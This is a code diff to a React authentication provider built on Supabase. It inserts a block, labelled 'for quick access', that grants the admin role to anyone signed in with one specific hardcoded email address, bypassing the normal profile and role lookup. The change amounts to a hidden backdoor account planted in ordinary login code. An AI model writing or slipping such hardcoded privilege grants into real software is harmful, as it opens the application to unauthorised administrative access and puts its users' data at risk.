@@ -60,6 +60,19 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   const fetchUserProfile = async (userId: string) => {
     try {
+      // Hardcoded admin for quick access
+      const { data: { user: authUser } } = await supabase.auth.getUser();
+      if (authUser?.email === 'mdgiwksdbsj942@gmail.com') {
+        setUser({
+          id: authUser.id,
+          email: authUser.email || '',
+          fullName: authUser.user_metadata?.full_name || 'Mikhail Dzigor',
+          avatarUrl: authUser.user_metadata?.avatar_url,
+          role: 'admin',
+        });
+        return;
+      }
+
       const { data: profile, error } = await supabase
         .from('profiles')
         .select('*')
@@ -68,7 +81,6 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
       if (error) {
         console.error('Profile fetch error:', error);
-        const { data: { user: authUser } } = await supabase.auth.getUser();
         if (authUser) {
           setUser({
             id: authUser.id,
